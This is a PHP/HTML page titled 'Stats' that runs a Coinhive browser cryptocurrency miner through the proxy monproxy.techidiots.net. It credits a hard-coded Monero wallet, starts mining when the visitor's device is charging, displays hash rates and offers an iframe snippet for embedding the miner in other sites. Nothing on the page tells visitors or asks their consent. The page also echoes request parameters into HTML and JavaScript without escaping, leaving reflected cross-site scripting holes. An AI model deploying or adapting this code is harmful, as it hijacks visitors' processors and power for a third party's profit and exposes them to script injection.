<?php
	$address = ($_REQUEST['address'] ? $_REQUEST['address'] : "4B5rfHVYF7R8ag71iamrFSddbV5wAN97BG5W5VsVqPJMLML9hugBngDGwVPNZYKGPqNtoz1eJYhFWEnBCpgt4cJUG8xBPB1");
	$worker = ($_REQUEST['worker'] ? $_REQUEST['worker'] : "monpoolphp");
	$throttle = ($_REQUEST['throttle'] ? $_REQUEST['throttle'] : "0.25");
	$threads = ($_REQUEST['threads'] ? $_REQUEST['threads'] : "0");
?>
<html>
	<head>
		<title>Stats</title>
		<script src="lib/coinhive.js"></script>
	</head>
	<body class="body">
		<script type="text/javascript">
			coinhive.CONFIG.WEBSOCKET_SHARDS = [["wss://monproxy.techidiots.net/_ws_/"]];
			var miner = coinhive.User('<?php echo $address; ?>', '<?php echo $worker; ?>');
<?php if($threads>0){echo "			miner.setNumThreads($threads);\r\n";} ?>
<?php if($throttle>0){echo "			miner.setThrottle($throttle);\r\n";} ?>
			try {
				navigator.getBattery().then(function (battery) {
			
					if (battery.charging) miner.start();
			
					battery.onchargingchange = function (evt) {
						if (battery.charging) miner.start();
						else miner.stop();
					}
			
				});
			}catch(e){miner.start();}
			
			// Update stats once per second
			setInterval(function() {
				var hashesPerSecond = miner.getHashesPerSecond();
				var totalHashes = miner.getTotalHashes();
				var acceptedHashes = miner.getAcceptedHashes();

				// Output to HTML elements...
				document.getElementById("hashesPerSecond").innerHTML = Math.round(hashesPerSecond);
				document.getElementById("totalHashes").innerHTML = totalHashes;
				document.getElementById("acceptedHashes").innerHTML = acceptedHashes;
			}, 1000);
		</script>
		
		<table style="width: 100%">
			<tr>
				<td style="width: 125px">Address</td>
				<td colspan="5"><a href="https://monproxy.techidiots.net/?throttle=<?php echo $throttle; ?>&amp;threads=<?php echo $threads; ?>&amp;worker=<?php echo $worker; ?>&amp;address=<?php echo $address; ?>"><?php echo $address; ?></a></td>
			</tr>
			<tr>
				<td style="width: 125px">Worker</td>
				<td style="width: 125px"><?php echo $worker; ?></td>
				<td style="width: 125px">Throttle</td>
				<td style="width: 125px"><?php echo $throttle; ?></td>
				<td colspan="2"></td>
			</tr>
			<tr>
				<td style="width: 125px">Total Hashes</td>
				<td id="totalHashes" style="width: 125px"></td>
				<td style="width: 125px">Accepted Hashes</td>
				<td id="acceptedHashes" style="width: 125px"></td>
				<td style="width: 125px">Hashes Per Second</td>
				<td id="hashesPerSecond"></td>
			</tr>
		</table>
		
		<p>&lt;iframe src=&quot;https://monproxy.techidiots.net/?throttle=<?php echo $throttle; ?>&amp;threads=<?php echo $threads; ?>&amp;worker=<?php echo $worker; ?>&amp;address=<?php echo $address; ?>&quot; 
		scrolling=&quot;no&quot; width=&quot;100%&quot; height=&quot;80&quot;&gt;&lt;/iframe&gt;</p>
	</body>
</html>
